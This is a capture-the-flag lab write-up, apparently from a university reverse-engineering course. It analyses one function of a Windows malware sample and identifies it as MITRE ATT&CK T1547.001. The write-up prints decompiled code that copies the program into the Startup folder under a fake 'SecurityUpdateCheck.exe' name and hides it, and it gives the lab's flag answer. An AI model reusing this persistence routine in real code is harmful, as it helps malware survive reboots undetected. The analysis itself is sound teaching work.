---
title: Simple Reverse - 0x16(2023 Lab - WinMalware - sub_140001C80)
tags: [eductf, CTF, Reverse]

category: "Security/Course/NTU CS/Reverse/WinMalware Lab"
---

# Simple Reverse - 0x16(2023 Lab - WinMalware - sub_140001C80)
<!-- more -->

## Description
> 分析 eductf-lab.exe 中的 function sub_140001C80 在做什麼，並找出其行為所對應的 MITRE ATT&CK technique ID。
> Flag format: FLAG{T1234.001}

## Background
* [GetModuleFileNameA](https://learn.microsoft.com/zh-tw/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulefilenamea)
* [GetUserNameA](https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-getusernamea)
* [CopyFileA](https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-copyfilea)
* [SetFileAttributesA](https://learn.microsoft.com/zh-tw/windows/win32/api/fileapi/nf-fileapi-setfileattributesa)

## Source code
* Main Function
    ```cpp
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      Sleep(0x1B7740u);
      sub_140001C80();
      sub_140001030();
      sub_140001120();
      sub_140001BF0();
      return 0;
    }
    ```
* sub_140001C80
    :::spoiler IDA Source Code
    ```cpp
    DWORD sub_140001C80()
    {
      DWORD result; // eax
      size_t v1; // rax
      DWORD v2; // [rsp+20h] [rbp-258h]
      const CHAR *lpNewFileName; // [rsp+28h] [rbp-250h]
      DWORD pcbBuffer[4]; // [rsp+30h] [rbp-248h] BYREF
      CHAR Buffer[272]; // [rsp+40h] [rbp-238h] BYREF
      CHAR Filename[272]; // [rsp+150h] [rbp-128h] BYREF

      result = GetModuleFileNameA(0i64, Filename, 0x104u);
      v2 = result;
      if ( result )
      {
        result = GetUserNameA(Buffer, pcbBuffer);
        if ( result )
        {
          v1 = pcbBuffer[0] + v2 + 100;
          if ( __CFADD__(pcbBuffer[0], v2 + 100) )
            v1 = -1i64;
          lpNewFileName = (const CHAR *)malloc(v1);
          sub_140001350(
            lpNewFileName,
            v2 + pcbBuffer[0] + 100,
            "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SecurityUpdateCheck.exe",
            Buffer);
          result = CopyFileA(Filename, lpNewFileName, 0);
          if ( result )
            return SetFileAttributesA(lpNewFileName, 0x26u);
        }
      }
      return result;
    }
    ```
    :::

## Recon
:::spoiler IDA sub_14001C80(解析版)
```cpp
DWORD copyfile2startup_setAttribute()
{
  DWORD Result; // eax
  size_t malloc_size; // rax
  DWORD filename_len; // [rsp+20h] [rbp-258h]
  const CHAR *file_new_path; // [rsp+28h] [rbp-250h]
  int username[4]; // [rsp+30h] [rbp-248h] BYREF
  CHAR username_buffer[272]; // [rsp+40h] [rbp-238h] BYREF
  CHAR Filename[272]; // [rsp+150h] [rbp-128h] BYREF

  Result = GetModuleFileNameA(0i64, Filename, 260u);// 取得目前執行程式的名稱
  filename_len = Result;                        // 回傳值為名稱長度
  if ( Result )
  {
    Result = GetUserNameA(username_buffer, username);// 取得使用者名稱
    if ( Result )
    {
      malloc_size = username[0] + filename_len + 100;
      if ( __CFADD__(username[0], filename_len + 100) )
        malloc_size = -1i64;
      file_new_path = malloc(malloc_size);
      sprintf(
        file_new_path,
        filename_len + username[0] + 100,
        "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SecurityUpdateCheck.exe",
        username_buffer);
      Result = CopyFileA(Filename, file_new_path, 0);
      if ( Result )
        return SetFileAttributesA(file_new_path, 0x26u);
    }
  }
  return Result;
}
```
:::
從解析版中開始由上而下可以知道攻擊者的完整意圖
1. 取得目前執行程式的名稱和名稱長度
2. 取得目前執行該程式的使用者名稱
3. 利用(username_length + filename_length + 100)這個大小取得malloc的空間
4. 利用sprintf，讓該空間儲存`C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SecurityUpdateCheck.exe`這個字串
5. 複製目前這個檔案到上一個file path
6. 設定新檔案的屬性(備份檔+隱藏檔+系統檔)

根據以上的流程很明顯他要把檔案放到每次開機都一定會執行的資料夾，並且不想讓使用者察覺到該檔案，所有操作都是為了之後或下一次開機的時候仍然能夠持續執行該程式$\to$Persistent

## Exploit
從ATT&CK的網站可以看到persistence的子頁面出現autostart其實和目前的狀態最吻合，就看他是用甚麼方法達到該目的，從其中的技巧來看會發現有很多種方法可以達到此效果，例如改變機碼或是改變lsass driver之類的，而我們的技巧被歸類在T1547.001
[Att&CK - T1547](https://attack.mitre.org/techniques/T1547/)
Flag: `FLAG{T1547.001}`